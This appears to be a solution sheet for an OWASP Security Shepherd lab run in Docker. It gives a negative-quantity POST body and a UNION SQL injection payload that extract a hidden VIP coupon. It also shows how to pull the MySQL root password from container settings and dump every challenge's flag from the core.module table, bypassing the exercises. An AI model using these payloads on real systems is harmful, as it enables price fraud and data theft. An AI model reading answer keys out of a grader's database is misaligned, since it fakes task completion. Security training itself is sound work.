# OWASP Security Shepherd — Lab Reference

## 1. Docker Commands to View the Container

```bash
# List all running containers
docker ps -a

# Filter for the Security Shepherd / scenario-2 stack
docker ps -a | grep -E "scenario-2|s2-mysql"

# Check port mapping for the proxy
docker inspect sclab-s2-proxy --format '{{.Config.Cmd}}'

# Check logs
docker logs sclab-scenario-2 --tail 50
docker logs sclab-s2-mysql --tail 50
```

## 2. Obtain the MySQL Container Password

```bash
docker inspect sclab-s2-mysql | grep -i MYSQL
```

This reveals environment variables such as:

```
MYSQL_ROOT_PASSWORD
MYSQL_USER
MYSQL_PASSWORD
MYSQL_DATABASE
```

Alternative — check the compose file generated by the lab launcher:

```bash
find /home/user/Downloads/.examlauncher-* -name "*.yml" -o -name "*.yaml" 2>/dev/null
cat /home/user/Downloads/.examlauncher-*/docker-compose.yml
```

Look at the** **`s2-mysql` service block for** **`MYSQL_ROOT_PASSWORD`.

## 3. Log Into the SQL Container

```bash
docker exec -it sclab-s2-mysql mysql -uroot -p
```

Enter the password obtained in Step 2 when prompted.

### Answer — Challenge 5 Solution

**Vulnerability:** The backend coupon lookup query only checks the** **`coupons` table:

```sql
SELECT itemId, perCentOff, itemName FROM coupons JOIN items USING (itemId) WHERE couponCode = '<input>';
```

The** **`vipCoupons` table (100% off Troll, itemId=2) is never queried by the app directly — but a UNION injection in the** **`couponCode` field can pull from it.

**Two valid solve paths:**

**Path A — Quantity manipulation (input validation bypass):**

```
POST body:
megustaAmount=0&trollAmount=1&rageAmount=0&notBadAmount=-100&couponCode=PleaseTakeARage
```

Math:** **`(3000 × 1) + (30 × -100) = 3000 - 3000 = $0` → free Troll →** ****key returned**

**Path B — UNION injection into couponCode (pulls VIP coupon):**

```
couponCode=' UNION SELECT itemId, perCentOff, couponCode FROM vipCoupons-- 
```

with** **`trollAmount=1`, applies the 100% off VIP coupon to the Troll →** **`$0` →** ****key returned**

## 6. Other Relevant Notes from Earlier Discussion

* **Quick one-liner to dump all keys without entering interactive shell:**
  ```bash
  docker exec sclab-s2-mysql mysql -uroot -p<password> -e "SELECT moduleName, resultKey FROM core.module;" 2>/dev/null
  ```
* **For any other SQLi challenge** , the same pattern applies:

1. `USE <ChallengeDB>;`
2. `SHOW TABLES;`
3. `SELECT * FROM <each table>;`
4. Identify the "intended" query path vs. a hidden/VIP table
5. Craft the UNION/quantity/logic payload that bridges the two

* **General workflow for finding the actual key/flag for any challenge:**
  ```sql
  USE core;
  SELECT * FROM module WHERE moduleName LIKE '%<partial challenge name>%';
  ```

  This returns the** **`resultKey` which is the flag submitted in the Shepherd UI to mark the challenge complete.
* **Web app access:** Security Shepherd UI runs on the scenario-2 container (ports 8080/8443), proxied via** **`sclab-s2-proxy`. Get the host port via:
  ```bash
  docker inspect sclab-s2-proxy --format '{{.Config.Cmd}}'
  ```
